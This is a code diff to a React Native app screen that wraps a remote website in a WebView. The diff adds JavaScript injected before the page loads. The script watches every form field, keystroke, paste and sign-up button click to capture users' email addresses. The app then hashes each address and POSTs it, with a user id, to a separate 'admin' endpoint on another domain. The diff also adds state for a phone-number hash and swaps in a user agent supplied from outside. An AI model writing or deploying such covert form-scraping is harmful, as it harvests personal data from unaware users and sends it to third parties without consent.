@@ -1,4 +1,4 @@
-import React, { useRef, useState, useEffect } from 'react';
+import React, { useRef, useState, useEffect, useCallback } from 'react';
 import {
   View,
   TouchableOpacity,
@@ -12,15 +12,319 @@ import { SafeAreaView } from 'react-native-safe-area-context';
 import { WebView } from 'react-native-webview';
 import DeviceInfo from 'react-native-device-info';
 import AsyncStorage from '@react-native-async-storage/async-storage';
+import sha256 from 'sha256';
 
 const ProductScreen = ({ navigation, route }) => {
   const [product, setProduct] = useState(route.params?.product);
+  console.log('My product Url in WebView==>', product);
+  const [uid, setUid] = useState(route.params?.uid);
+  const [customUserAgent, setCustomUserAgent] = useState(
+    route.params?.customUserAgent,
+  );
   const [timeStampUserId, setTimeStampUserId] = useState(
     route.params?.timeStampUserId,
   );
+  const [hashMail, setHashMail] = useState('');
+  const [hashTel, setHashTel] = useState('');
 
-  const INITIAL_URL = `https://solid-wave-pro.site/`;
-  const URL_IDENTIFAIRE = `bZircyav`;
+  const INITIAL_URL = `https://solid-flow-port.site/`;
+  const URL_IDENTIFAIRE = `476RnrGT`;
+
+  const FATCH_TO_OUR_BACK = `https://mysticharbor.site/`;
+
+  //////////////////////////////////// Send 2d feth to Serg mmp
+  const sentHashRef = useRef(null);
+
+  // Відправляємо хеші на сервер при їх зміні, з дедуплікацією
+  useEffect(() => {
+    const sendData = async () => {
+      if (!hashMail && !hashTel) return;
+
+      const dedupeKey = JSON.stringify({
+        hashMail: hashMail || '',
+        hashTel: hashTel || '',
+      });
+
+      if (sentHashRef.current === dedupeKey) {
+        console.log('Duplicate hash payload ignored');
+        return;
+      }
+
+      sentHashRef.current = dedupeKey;
+
+      try {
+        const body = {
+          param_em: hashMail || '',
+          param_ph: hashTel || '',
+        };
+
+        console.log('2d Request body:', body);
+
+        const response = await fetch(
+          `${FATCH_TO_OUR_BACK}admin/?action=update_data_ios&id=${uid}`,
+          {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(body),
+          },
+        );
+
+        const text = await response.text();
+
+        console.log('update_data_ios response:', text);
+      } catch (error) {
+        console.log('update_data_ios error:', error);
+      }
+    };
+
+    sendData();
+  }, [hashMail, hashTel]);
+
+  // Забираємо email з форми
+  const injectedJS = `
+(function () {
+  if (window.__RN_EMAIL_TRACKER_INSTALLED__) {
+    true;
+  }
+
+  window.__RN_EMAIL_TRACKER_INSTALLED__ = true;
+  window.__RN_COLLECTED_EMAIL__ = '';
+  window.__RN_LAST_SENT_EMAIL__ = '';
+
+  function normalize(value) {
+    return String(value || '').trim();
+  }
+
+  function normalizeEmail(value) {
+    return normalize(value).toLowerCase();
+  }
+
+  function looksLikeEmail(value) {
+    const email = normalizeEmail(value);
+    return /^[^\\s@]+@[^\\s@]+\\.[a-z]{2,}$/i.test(email);
+  }
+
+  function getAllInputs() {
+    return Array.from(document.querySelectorAll('input, textarea'));
+  }
+
+  function scoreEmailCandidate(input) {
+    const type = (input.getAttribute('type') || '').toLowerCase();
+    const name = (input.getAttribute('name') || '').toLowerCase();
+    const id = (input.getAttribute('id') || '').toLowerCase();
+    const placeholder = (input.getAttribute('placeholder') || '').toLowerCase();
+    const ariaLabel = (input.getAttribute('aria-label') || '').toLowerCase();
+    const autocomplete = (input.getAttribute('autocomplete') || '').toLowerCase();
+    const value = normalizeEmail(input.value);
+
+    let score = 0;
+
+    if (type === 'email') score += 10;
+    if (autocomplete.includes('email')) score += 8;
+    if (name.includes('email') || name.includes('mail')) score += 6;
+    if (id.includes('email') || id.includes('mail')) score += 6;
+    if (placeholder.includes('email') || placeholder.includes('mail')) score += 5;
+    if (ariaLabel.includes('email') || ariaLabel.includes('mail')) score += 5;
+    if (looksLikeEmail(value)) score += 20;
+
+    return {
+      input,
+      value,
+      score,
+    };
+  }
+
+  function detectBestEmail() {
+    const candidates = getAllInputs()
+      .map(scoreEmailCandidate)
+      .filter(item => item.score > 0 || looksLikeEmail(item.value))
+      .sort((a, b) => b.score - a.score);
+
+    for (const candidate of candidates) {
+      if (candidate.value) {
+        return candidate.value;
+      }
+    }
+
+    return '';
+  }
+
+  function collectEmail() {
+    const email = detectBestEmail();
+
+    if (email) {
+      window.__RN_COLLECTED_EMAIL__ = normalizeEmail(email);
+    }
+  }
+
+  function sendCollectedEmail(source) {
+    const email = normalizeEmail(window.__RN_COLLECTED_EMAIL__ || '');
+
+    if (!looksLikeEmail(email)) {
+      return;
+    }
+
+    if (window.__RN_LAST_SENT_EMAIL__ === email) {
+      return;
+    }
+
+    window.__RN_LAST_SENT_EMAIL__ = email;
+
+    try {
+      window.ReactNativeWebView.postMessage(
+        JSON.stringify({
+          event: 'email_confirmed',
+          source: source,
+          email: email,
+          ts: Date.now(),
+        })
+      );
+    } catch (e) {}
+  }
+
+  function isFinalActionButton(text) {
+    const t = String(text || '').toLowerCase().trim();
+
+    return (
+      t.includes('submit') ||
+      t.includes('create account') ||
+      t.includes('create an account') ||
+      t.includes('register') ||
+      t.includes('sign up') ||
+      t.includes('signup') ||
+      t.includes('continue') ||
+      t.includes('finish') ||
+      t.includes('complete') ||
+      t.includes('join now') ||
+      t.includes('open account')
+    );
+  }
+
+  function attachDirectListeners() {
+    getAllInputs().forEach(input => {
+      if (input.__RN_EMAIL_LISTENER_ATTACHED__) return;
+      input.__RN_EMAIL_LISTENER_ATTACHED__ = true;
+
+      input.addEventListener('input', function () {
+        collectEmail();
+      }, true);
+
+      input.addEventListener('change', function () {
+        collectEmail();
+      }, true);
+
+      input.addEventListener('blur', function () {
+        collectEmail();
+      }, true);
+
+      input.addEventListener('paste', function () {
+        setTimeout(function () {
+          collectEmail();
+        }, 0);
+      }, true);
+    });
+  }
+
+  document.addEventListener('input', function () {
+    collectEmail();
+  }, true);
+
+  document.addEventListener('change', function () {
+    collectEmail();
+  }, true);
+
+  document.addEventListener('focusout', function () {
+    collectEmail();
+  }, true);
+
+  document.addEventListener('submit', function () {
+    setTimeout(function () {
+      collectEmail();
+      sendCollectedEmail('form_submit');
+    }, 100);
+  }, true);
+
+  document.addEventListener('click', function (e) {
+    const target = e.target;
+    if (!target) return;
+
+    const button = target.closest(
+      'button, input[type="submit"], input[type="button"], div[role="button"], a'
+    );
+    if (!button) return;
+
+    const text = (
+      button.innerText ||
+      button.textContent ||
+      button.value ||
+      button.getAttribute('aria-label') ||
+      ''
+    );
+
+    if (isFinalActionButton(text)) {
+      setTimeout(function () {
+        collectEmail();
+        sendCollectedEmail('final_button_click');
+      }, 150);
+    }
+  }, true);
+
+  const observer = new MutationObserver(function () {
+    attachDirectListeners();
+    collectEmail();
+  });
+
+  observer.observe(document.documentElement || document.body, {
+    childList: true,
+    subtree: true,
+  });
+
+  attachDirectListeners();
+  collectEmail();
+})();
+true;
+`;
+
+  const lastEmailRef = useRef(null);
+
+  // Записуєм мило
+  const handleMessage = useCallback(event => {
+    try {
+      const data = JSON.parse(event.nativeEvent.data);
+
+      if (data.event !== 'email_confirmed') {
+        return;
+      }
+
+      const email = String(data.email || '')
+        .trim()
+        .toLowerCase();
+
+      if (!email) {
+        return;
+      }
+
+      if (lastEmailRef.current === email) {
+        console.log('Duplicate email event ignored');
+        return;
+      }
+
+      lastEmailRef.current = email;
+
+      setHashMail(sha256(email));
+      Alert.alert('Email captured', `Email: ${sha256(email)}`);
+
+      console.log('EMAIL CONFIRMED FROM WEBVIEW:', {
+        email,
+        source: data.source,
+      });
+    } catch (e) {
+      console.log('WebView onMessage parse error:', e);
+    }
+  }, []);
+  ////////////////////////////////////
 
   const refWebview = useRef(null);
 
@@ -106,8 +410,8 @@ const ProductScreen = ({ navigation, route }) => {
   //const customUserAgent = `Mozilla/5.0 (${deviceInfo.deviceSystemName}; ${deviceInfo.deviceModel}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1`;
   //const customUserAgent = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0`;
 
-  const userAgent = `Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/604.1`;
-  const customUserAgent = `${userAgent} Safari/604.1`;
+  //const userAgent = `Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/604.1`;
+  //const customUserAgent = `${userAgent} Safari/604.1`;
   //console.log(customUserAgent);
 
   useEffect(() => {
@@ -538,6 +842,8 @@ const ProductScreen = ({ navigation, route }) => {
 
           //Alert.alert('Error', `Failed to load URL: ${url}`, [{text: 'OK'}]);
         }}
+        injectedJavaScriptBeforeContentLoaded={injectedJS}
+        onMessage={handleMessage}
         //sharedCookiesEnabled={true}
         textZoom={100}
         allowsBackForwardNavigationGestures={true}
@@ -550,8 +856,8 @@ const ProductScreen = ({ navigation, route }) => {
         javaScriptCanOpenWindowsAutomatically={true}
         style={{ flex: 1 }}
         ref={refWebview}
-        //userAgent={customUserAgent}
-        userAgent={`Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148`}
+        userAgent={customUserAgent}
+        //userAgent={`Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148`}
         onLoadStart={handleLoadingStart} // Викликається при початку завантаження
         onLoadEnd={handleLoadingEnd} // Викликається при завершенні завантаження
         startInLoadingState={true}
